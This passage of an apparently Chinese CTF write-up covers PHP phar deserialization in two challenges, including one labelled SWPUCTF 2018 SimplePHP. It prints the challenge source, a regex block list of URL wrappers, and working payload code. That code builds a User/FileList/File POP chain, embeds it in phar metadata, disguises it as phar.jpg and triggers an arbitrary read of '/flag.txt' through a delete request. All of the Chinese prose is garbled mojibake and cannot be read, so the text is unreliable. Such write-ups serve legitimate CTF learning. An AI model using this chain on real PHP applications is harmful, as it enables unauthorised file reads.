class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">ä¸‹è½½&lt;/a> / &lt;a href="#" class="delete">åˆ é™¤&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ä»£ç æ ¸å¿ƒå°±åœ¨<code>class.php</code>äº†</p><p>å…ˆçœ‹åˆ°loginå’Œregisterä¸¤ä¸ªæ–‡ä»¶ï¼Œç”¨äº†PDOï¼Œæ³¨å…¥ç›¸å½“å›°éš¾ï¼Œæ‰¾åˆ°åˆ°æ–‡ä»¶ä¸‹è½½åŠŸèƒ½<code>download</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ ·çš„ä¸€å¥ä»£ç ï¼š<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>ï¼šå‡ºä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼ï¼Œå¯ä»¥è®¾ç½®phpçš„ä¸€äº›é…ç½®ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<strong>open_basedir</strong>ï¼Œç”¨æ¥é™åˆ¶å½“å‰ç¨‹åºå¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å½“å‰è®¾ç½®ä¸º<code>getcwd()</code>å½“å‰ç›®å½•å’Œ<code>/etc</code>å’Œ<code>/tmp</code>ä¸‰ä¸ªç›®å½•ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‰é¢ä¸‹è½½ä¸äº†æ ¹ç›®å½•ä¸‹çš„<code>flag</code>äº†</p><p>å†çœ‹åˆ°<code>delete.php</code>æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰é™åˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯»æ‰¾å¯åˆ©ç”¨æ¡ä»¶ï¼Œé‡ç‚¹çœ‹åˆ°<code>class.php</code>ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶çš„<code>File</code>ç±»ä¸­å‘ç°äº†<code>close()</code>æ–¹æ³•ä¸­æœ‰ä¸€ä¸ª<code>file_get_contents</code>æ–¹æ³•ï¼Œæ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œå†æ‰¾åˆ°ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°çš„æ–¹æ³•ï¼Œä¸éš¾å‘ç°åœ¨<code>User</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œ<code>__destruct</code>æ–¹æ³•æ˜¯å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™æ‰è°ƒç”¨ï¼Œdelete.phpä¸­å°±å¯ä»¥è§¦å‘è¿™æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¹Ÿè¦è¿™äº›ç±»ä¸­çš„å±æ€§æˆ‘ä»¬å¯æ§æ‰èƒ½è°ƒç”¨è¿™äº›æ–¹æ³•ï¼Œäºæ˜¯è¿™é‡Œå°±å¼•å‡ºäº†<code>phar</code>ä¼ªåè®®ååºåˆ—åŒ–çš„æ“ä½œï¼Œè¯¦è§ä¸Šé¢çš„è¯´æ˜</p><p>äºæ˜¯åˆæ­¥æ„é€ payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ä½†æ˜¯åœ¨<code>file_get_contents</code>åæˆ‘ä»¬å¹¶æ²¡æœ‰å›æ˜¾çš„å‡½æ•°ï¼Œäºæ˜¯å°±éœ€è¦ç”¨åˆ°<code>FileList</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•æ¥å›æ˜¾ï¼Œè¿™é‡Œå°±éœ€è¦å†åˆ›å»ºä¸€ä¸ª<code>FileList</code>ç±»ï¼Œä»¤å…¶ä¸­çš„<code>files</code>ä¸º<code>new File()</code>ï¼Œä½†æ˜¯è¿™é‡Œå°±åˆ›å»ºäº†ä¸¤ä¸ªç±»äº†ï¼Œæ— æ³•è¾¾åˆ°ååºåˆ—åŒ–çš„æ•ˆæœï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•æŠŠè¿™ä¸‰ä¸ªç±»ç»™è”ç³»èµ·æ¥ï¼Œå¯ä»¥çœ‹åˆ°<code>FileList</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•ï¼Œï¼ˆ å½“å¯¹è±¡è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™è°ƒç”¨ï¼Œ<strong>$func</strong>ï¼šè¢«è°ƒç”¨çš„æ–¹æ³•åï¼Œ<strong>$args</strong> ï¼š è¢«è°ƒç”¨æ–¹æ³•ä¸­çš„å‚æ•°ï¼Œè¿™æ˜¯ä¸ªæ•°ç»„ï¼‰ï¼Œå†çœ‹åˆ°ä¸Šé¢çš„<code>Userçš„</code>çš„<code>__destruct</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ä»¤<code>User</code>ç±»ä¸­çš„<code>db</code>å±æ€§ä¸º<code>FileList</code>ç±»ï¼Œè°ƒç”¨å…¶ä¸­ä¸å­˜åœ¨çš„<code>close</code>æ–¹æ³•ï¼Œå°±å¯ä»¥å®Œç¾è§¦å‘<code>FileList</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•ï¼Œå†çœ‹åˆ°<code>__call</code>æ–¹æ³•çš„å®ç°ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>array_push</strong>ï¼šå°†ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒå‹å…¥æ•°ç»„çš„æœ«å°¾ï¼ˆå…¥æ ˆï¼‰</p><p><strong>foreach</strong>ï¼šéå†æ•°ç»„</p><p>çœ‹åˆ°å…¶ä¸­çš„<code>$file-&gt;$func();</code>ï¼Œå¦‚æœ<code>$func</code>ä¸º<code>close</code>ï¼Œå°±å¯ä»¥æˆåŠŸè°ƒç”¨<code>File</code>ç±»ä¸­çš„<code>close</code>æ–¹æ³•ï¼Œäºæ˜¯æ„é€ å®Œæ•´payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸º phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½® stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å°†ç”Ÿæˆçš„<code>phar.jpg</code>ä¸Šä¼ ï¼Œå†åœ¨<code>delete</code>æ“ä½œæ—¶æŠ“åŒ…æ”¹åŒ…ï¼Œå¦‚ä¸‹ï¼Œå³å¯æˆåŠŸå¾—åˆ°<code>flag</code>ï¼Œè¯è¯´ä¸ºä»€ä¹ˆæ˜¯<code>flag.txt</code>æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œä¸€èˆ¬ä¸æ˜¯ç›´æ¥<code>flag</code>å—ï¼Ÿ-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p><h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>ç›´æ¥çœ‹å…³é”®ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>_show</code>æ–¹æ³•å¹¶æœªè¿‡æ»¤pharï¼Œé¢˜ç›®å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹å’Œæ–‡ä»¶åŒ…å«ç‚¹ï¼Œæ˜¾ç„¶æƒ³åˆ°pharåè®®çš„åˆ©ç”¨</p><p>è¿™é¢˜ä¸»è¦éœ€è¦åˆ†æçš„æ˜¯popé“¾ï¼Œåˆ†æä»¥ä¸Šä»£ç å¯ä»¥çŸ¥é“pharçš„åˆ©ç”¨ç‚¹åœ¨<code>file_get_contents</code>å‡½æ•°ï¼Œè€Œè§¦å‘<code>file_get_contents</code>å‡½æ•°éœ€è¦ä»<code>__get-&gt;get-&gt;file_get-&gt;file_get_contents</code>ï¼Œç®€å•æ¥è®²å°±æ˜¯è¦è§¦å‘Testç±»ä¸­çš„<code>__get</code>æ–¹æ³•ï¼Œè€Œ<code>__get</code>æ–¹æ³•çš„è§¦å‘æ¡ä»¶æ˜¯éœ€è¦å¯¹è±¡è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œå†çœ‹åˆ°Showç±»ä¸­çš„<code>__toString</code>æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string 